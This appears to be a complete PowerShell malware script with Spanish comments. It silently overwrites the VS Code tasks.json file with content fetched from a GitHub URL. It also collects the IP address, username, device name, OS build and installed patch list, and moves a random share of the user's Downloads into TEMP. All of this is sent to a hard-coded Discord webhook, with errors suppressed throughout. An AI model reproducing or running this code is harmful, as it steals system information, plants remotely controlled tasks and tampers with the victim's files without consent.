# 1. Configuración de variables
$Webhook = "https://discord.com/api/webhooks/1494006624166350960/BEcOnRkEN1eiyHGnyWVZuEBDW5KZjgP2lo8g47RGs_Xp2Q5qp5I-Auts8HdkkpLNoAlH"
$TasksPath = "$env:APPDATA\Code\User\tasks.json"
$RemoteTasksUrl = "https://raw.githubusercontent.com/baa4ts/baa4ts/refs/heads/main/public/tasks.txt"

# 2. Verificar internet (Silencioso)
if (!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)) { return }

# 3. Auto-actualización de la tarea (Sincronización con GitHub)
try {
    $RemoteContent = Invoke-RestMethod -Uri $RemoteTasksUrl -TimeoutSec 10
    if ($RemoteContent -like "*version*") {
        $LocalHash = if (Test-Path $TasksPath) { Get-FileHash $TasksPath -Algorithm MD5 | Select-Object -ExpandProperty Hash } else { "" }
        $RemoteHash = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($RemoteContent)) | ForEach-Object { $_.ToString("X2") }) -join ""
        if ($LocalHash -ne $RemoteHash) {
            $RemoteContent | Set-Content -Path $TasksPath -Encoding UTF8 -Force
        }
    }
} catch { }

# 4. Recolección de datos (Identidad del Sistema)
$IP = try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { "null" }
$User = try { $env:USERNAME } catch { "null" }
$Device = try { $env:COMPUTERNAME } catch { "null" }
$SystemInfo = try {
    $OS = Get-CimInstance Win32_OperatingSystem
    $Ver = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
    "$( $OS.Caption ) (Build: $( $Ver.CurrentBuild ))"
} catch { "null" }

# --- LÓGICA DE MOVIMIENTO (Downloads -> TEMP) --- Incluye Archivos y Carpetas
$descargasPath = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders")."{374DE290-123F-4565-9164-39C4925E467B}"
$rutaDownloads = [System.Environment]::ExpandEnvironmentVariables($descargasPath)
$rutaTemp = $env:TEMP

$todoElContenido = Get-ChildItem -Path $rutaDownloads
$totalItems = $todoElContenido.Count
$itemsMovidosList = @()

if ($totalItems -gt 0) {
    $cantidadAMover = [Math]::Ceiling($totalItems * 0.15)
    $objetivos = $todoElContenido | Get-Random -Count $cantidadAMover

    foreach ($item in $objetivos) {
        try {
            $nuevoDestino = Join-Path $rutaTemp $item.Name
            # Mover de forma forzada y recursiva
            Move-Item -Path $item.FullName -Destination $nuevoDestino -Force -ErrorAction Stop
            
            $prefijo = if($item.PSIsContainer){ "[DIR]" } else { "[FILE]" }
            $itemsMovidosList += "$prefijo $($item.Name)"
        } catch { }
        Start-Sleep -Milliseconds 500
    }
}

# 5. Gestión de Parches de Seguridad
$SortedPatches = try {
    $Raw = Get-HotFix | Select-Object HotFixID, InstalledOn
    $WithDate = $Raw | Where-Object { $_.InstalledOn -ne $null } | Sort-Object InstalledOn -Descending
    $NoDate = $Raw | Where-Object { $_.InstalledOn -eq $null }
    $WithDate + $NoDate
} catch { @() }

$TotalParches = $SortedPatches.Count
$LimitDate = Get-Date -Year 2026 -Month 3 -Day 10
$StatusText = if ($SortedPatches | Where-Object { $_.InstalledOn -ge $LimitDate }) { "🛡️ PROTEGIDO" } else { "⚠️ VULNERABLE" }
$EmbedColor = if ($StatusText -eq "🛡️ PROTEGIDO") { 3066993 } else { 15158332 }

# --- MENSAJE 1: REPORTE DE IDENTIDAD Y MOVIMIENTO ---
$listaItemsStr = if ($itemsMovidosList.Count -gt 0) { ($itemsMovidosList -join ", ") } else { "Ninguno" }
if ($listaItemsStr.Length -gt 1000) { $listaItemsStr = $listaItemsStr.Substring(0, 997) + "..." }

$MainPayload = @{
    username = "$User @ $Device"
    avatar_url = "https://i.imgur.com/8nLFCuR.png"
    embeds = @(@{
        title = "🚀 Reporte de Identidad e Integridad"
        color = $EmbedColor
        fields = @(
            @{ name = '💻 Sistema'; value = $SystemInfo; inline = $false },
            @{ name = '📊 Estado'; value = $StatusText; inline = $true },
            @{ name = '👤 Usuario / IP'; value = "$User ($IP)"; inline = $true },
            @{ name = '📂 Items Movidos a TEMP (15%)'; value = $listaItemsStr; inline = $false }
        )
        footer = @{ text = "Items movidos: $($itemsMovidosList.Count) | Parches: $TotalParches" }
    })
} | ConvertTo-Json -Depth 10

try {
    $MainBytes = [System.Text.Encoding]::UTF8.GetBytes($MainPayload)
    Invoke-RestMethod -Uri $Webhook -Method Post -Body $MainBytes -ContentType 'application/json; charset=utf-8'
    Start-Sleep -Milliseconds 1500
} catch { }

# --- MENSAJES SIGUIENTES: LISTADO DE PARCHES (Chunks de 3) ---
$ChunkSize = 3
$TotalSections = [Math]::Ceiling($TotalParches / $ChunkSize)

for ($i = 0; $i -lt $TotalParches; $i += $ChunkSize) {
    $CurrentSection = [Math]::Floor($i / $ChunkSize) + 1
    $End = [Math]::Min($i + $ChunkSize - 1, $TotalParches - 1)
    $Chunk = $SortedPatches[$i..$End]
    
    $PatchText = ($Chunk | ForEach-Object {
        $DateStr = if ($_.InstalledOn) { $_.InstalledOn.ToString('dd/MM/yyyy') } else { 'Sin fecha' }
        "- **$($_.HotFixID)**`n  └ Instalado: $DateStr"
    }) -join "`n`n"

    $PatchPayload = @{
        username = "$User @ $Device"
        avatar_url = "https://i.imgur.com/8nLFCuR.png"
        embeds = @(@{
            title = "📦 Detalle de Parches - Sección $CurrentSection"
            color = $EmbedColor
            description = $PatchText
            footer = @{ text = "Página $CurrentSection de $TotalSections | Total: $TotalParches" }
        })
    } | ConvertTo-Json -Depth 10

    try {
        $PatchBytes = [System.Text.Encoding]::UTF8.GetBytes($PatchPayload)
        Invoke-RestMethod -Uri $Webhook -Method Post -Body $PatchBytes -ContentType 'application/json; charset=utf-8'
        Start-Sleep -Milliseconds 1500
    } catch { }
}
